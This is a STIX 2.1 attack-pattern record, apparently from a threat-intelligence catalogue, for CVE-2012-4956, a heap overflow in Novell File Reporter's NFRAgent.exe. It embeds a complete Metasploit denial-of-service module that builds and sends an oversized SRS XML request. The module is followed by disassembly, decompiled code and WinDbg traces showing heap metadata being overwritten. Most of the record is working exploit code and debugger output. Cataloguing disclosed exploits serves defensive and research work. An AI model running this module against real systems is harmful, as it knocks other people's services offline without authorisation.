{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1ddae3af-20c9-43f7-af2e-d1e51ba3dd6b",
    "created": "2024-08-14T16:26:11.248223Z",
    "modified": "2024-08-14T16:26:11.248228Z",
    "name": "NFR Agent Heap Overflow Vulnerability",
    "description": " This module exploits a heap overflow in NFRAgent.exe, a component of Novell File Reporter (NFR). The vulnerability occurs when handling requests of name \"SRS\" where NFRAgent.exe fails to generate a response in a secure way, copying user controlled data into a fixed-length buffer in the heap without bounds checking. This module has been tested against NFR Agent 1.0.4.3 (File Reporter 1.0.2). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/novell_file_reporter_heap_bof.rb",
            "external_id": "novell_file_reporter_heap_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4956"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NFR Agent Heap Overflow Vulnerability',\n      'Description'    => %q{\n          This module exploits a heap overflow in NFRAgent.exe, a component of Novell\n        File Reporter (NFR). The vulnerability occurs when handling requests of name \"SRS\",\n        where NFRAgent.exe fails to generate a response in a secure way, copying user\n        controlled data into a fixed-length buffer in the heap without bounds checking.\n        This module has been tested against NFR Agent 1.0.4.3 (File Reporter 1.0.2).\n      },\n      'Author'         => [ 'juan vazquez' ],\n      'License'        => MSF_LICENSE,\n      'References'     => [\n        [ 'CVE', '2012-4956' ],\n        [ 'URL', 'https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/' ]\n      ],\n      'DisclosureDate' => '2012-11-16'))\n\n    register_options(\n      [\n        Opt::RPORT(3037),\n        OptBool.new('SSL', [true, 'Use SSL', true])\n      ])\n\n  end\n\n  def run\n    record = \"<RECORD>\"\n    record << \"<NAME>SRS</NAME><OPERATION>4</OPERATION><CMD>7</CMD>\" # Operation\n    record << \"<VOL>#{Rex::Text.rand_text_alpha(10)}</VOL>\" * 0xc35 # Volumes\n    record << \"</RECORD>\"\n\n    md5 = Rex::Text.md5(\"SRS\" + record + \"SERVER\").upcase\n    message = md5 + record\n\n    print_status(\"Triggering a heap overflow to cause DoS...\")\n\n    begin\n    res = send_request_cgi(\n      {\n        'uri'     => '/FSF/CMD',\n        'version' => '1.1',\n        'method'  => 'POST',\n        'ctype'   => \"text/xml\",\n        'data'    => message\n      })\n    rescue ::Errno::ECONNRESET\n      print_good(\"NFR Agent didn't answer, DoS seems successful\")\n      return\n    end\n\n    if res\n      print_error(\"NFR Agent didn't die, it still answers...\")\n      return\n    end\n\n    print_good(\"NFR Agent didn't answer, DoS seems successful\")\n  end\nend\n\n=begin\n\n* Static analysis\n\n1) Handling of \"SRS\" records happens in handle_SRS_sub_4048D0:\n\n.text:00404BE9                 add     esp, 0Ch\n.text:00404BEC                 push    14h             ; length_arg_C\n.text:00404BEE                 lea     eax, [ebp+record_name_var_28]\n.text:00404BF1                 push    eax             ; result_arg_8\n.text:00404BF2                 push    offset aName    ; \"NAME\"\n.text:00404BF7                 mov     ecx, [ebp+message_arg_8]\n.text:00404BFA                 add     ecx, 20h\n.text:00404BFD                 push    ecx             ; xml_message_arg_0\n.text:00404BFE                 mov     ecx, [ebp+var_2C]\n.text:00404C01                 call    parse_tag_sub_40A760 ; search tag \"NAME\" in the xml_message_arg_0 and store contents int he \"record_name_var_28\" variable\n.text:00404C06                 movzx   edx, al\n.text:00404C09                 test    edx, edx\n.text:00404C0B                 jz      short loc_404C8B\n.text:00404C0D                 push    offset aSrs_2   ; \"SRS\"\n.text:00404C12                 lea     eax, [ebp+record_name_var_28]\n.text:00404C15                 push    eax             ; char *\n.text:00404C16                 call    _strcmp         ; compares the contents of the \"NAME\"  element in the xml message from the request with the \"SRS\" string.\n.text:00404C1B                 add     esp, 8\n.text:00404C1E                 test    eax, eax\n.text:00404C20                 jnz     short loc_404C38 ; if not \"SRS\" name check others, if yes, handle it...\n.text:00404C22                 mov     ecx, [ebp+message_arg_8]\n.text:00404C25                 push    ecx             ; void *\n.text:00404C26                 mov     edx, [ebp+arg_4]\n.text:00404C29                 push    edx             ; int\n.text:00404C2A                 mov     eax, [ebp+arg_0]\n.text:00404C2D                 push    eax             ; int\n.text:00404C2E                 call    handle_SRS_sub_4048D0 ; handle the XML message with the RECORD of NAME \"SRS\"\n\n2) In this function memory is allocated to store the response which will be build:\n\n.text:00404903                 push    0C350h          ; size_t\n.text:00404908                 call    _malloc\n.text:0040490D                 add     esp, 4\n.text:00404910                 mov     [ebp+response_var_8], eax\n\n0:007> g\nBreakpoint 0 hit\neax=009e68b8 ebx=003f3bf8 ecx=b85645ca edx=7c90e4f4 esi=003f3bf8 edi=00000000\neip=00404908 esp=0120ff4c ebp=0120ff58 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\nNFRAgent+0x4908:\n00404908 e84cef0300      call    NFRAgent+0x43859 (00443859)\n0:007> dd esp L1\n0120ff4c  0000c350\n0:007> p\neax=01220110 ebx=003f5e20 ecx=7c9101bb edx=009e0608 esi=003f5e20 edi=00000000\neip=0040490d esp=0120ff4c ebp=0120ff58 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\nNFRAgent+0x490d:\n0040490d 83c404          add     esp,4\n0:007> !heap -p -a eax\n    address 01220110 found in\n_HEAP @ 9e0000\n      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state\n        01220108 186b 0000  [01]   01220110    0c350 - (busy)\n\n3) The SRS record used in this module is handled by:\n\n.text:004082E0 ; int __stdcall SRS_7_4_sub_4082E0(char *xml_message_arg_0, char\n*result_response_arg_4)\n\n4) The handling function allow to overflow the heap buffer when a big number of VOL elements are processed:\n\n    for ( vol_object_var_254 = v25; vol_object_var_254; vol_object_var_254 = *(_DWORD\n*)(vol_object_var_254 + 12) )\n    {\n      parse_tag_sub_40A760((void *)v15, *(const char **)vol_object_var_254, (int)\"VOL\",\n&vol_name_var_20c, 0x1F4u); // get VOL element\n      volume_fspace_vol_35C = handle_volume_sub_4081E0(&vol_name_var_20c); // Retrieve Volume\nFree Space\n      volume_fscape_var_358 = v2;\nvol_name_html_encode_var_494 = html_encode_sub_40B490(&vol_name_var_20c); // HTML Encode\nthe volume name (user controlled data)\n      if ( vol_name_html_encode_var_494 )\n{ // If the volume name has been HTML Encoded\n        v3 = volume_fscape_var_358;\nv4 = volume_fspace_vol_35C;\nv5 = vol_name_html_encode_var_494;\nv6 = strlen(result_response_arg_4);\nsprintf(&result_response_arg_4[v6], \"<VOL><NAME>%s</NAME><FSPACE>%I64d</FSPACE></VOL>\",\nv5, v4, v3); // Vulnerability!!! sprintf user controlled data (volume name) to the end of the\nfix-length buffer in the heap without bound checking\n        free(vol_name_html_encode_var_494);\n        vol_name_html_encode_var_494 = 0;\n      }\nelse\n{ // If the volume name hasn\u2019t been HTML Encoded\n        v7 = volume_fscape_var_358;\nv8 = volume_fspace_vol_35C;\nv9 = strlen(result_response_arg_4);\nsprintf(\n          &result_response_arg_4[v9], // Vulnerability!!! sprintf user controlled data (volume\nname) to the end of the fix-length buffer in the heap without bound checking\n          \"<VOL><NAME>%s</NAME><FSPACE>%I64d</FSPACE></VOL>\",\n&vol_name_var_20c,\nv8,\nv7);\n      }\n    }\n\nThe results for every volume (VOL element) are attached to the fixed-length heap buffer via the sprintf at 004085C5:\n\nBreakpoint 1 hit\neax=0122013e ebx=003f5e20 ecx=01220110 edx=c7ff3d52 esi=00479f89 edi=0120f1a1\neip=004085c5 esp=0120eec8 ebp=0120f3c0 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\nNFRAgent+0x85c5:\n004085c5 e84ea70300      call    NFRAgent+0x42d18 (00442d18)\n0:007> dd esp L1\n0120eec8  0122013e\n0:007> !heap -p -a 0122013e\n    address 0122013e found in\n_HEAP @ 9e0000\n      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state\n        01220108 186b 0000  [01]   01220110    0c350 - (busy)\n0:007> da poi(esp+4)\n0047a040  \"<VOL><NAME>%s</NAME><FSPACE>%I64\"\n0047a060  \"d</FSPACE></VOL>\"\n0:007> da poi(esp+8)\n01250208  \"AAAAAAAAAA\"\n\nAfter the loop handling VOL overflows the heap buffer and both heap chunk metadata and contents are\noverwritten for the chunk just after the vulnerable one:\n\n0:007> g\nBreakpoint 0 hit\neax=00000000 ebx=003f5e20 ecx=00443085 edx=012501b0 esi=00479f89 edi=0120f1a1\neip=00408645 esp=0120eedc ebp=0120f3c0 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nNFRAgent+0x8645:\n00408645 c7852cfbffff00000000 mov dword ptr [ebp-4D4h],0 ss:0023:0120eeec=03ee2001\n0:007> !heap -p -a 01220110\n    address 01220110 found in\n    _HEAP @ 9e0000\n      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state\n        01220108 186b 0000  [01]   01220110    0c350 - (busy)\n0:007> !heap -p -a 01220110+0xc350\n    address 0122c460 found in\n_HEAP @ 9e0000\n      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state\n        0122c460 3e45 0000  [46]   0122c468    1f220 - (free)\n0:007> db 0122c460 L8\n0122c460  45 3e 30 3c 2f 46 53 50                          E>0</FSP\n0:007> db 0122c468 L10\n0122c468  41 43 45 3e 3c 2f 56 4f-4c 3e 3c 56 4f 4c 3e 3c  ACE></VOL><VOL><\n=end\n",
    "x_mitre_disclosure_date": "2012-11-16"
}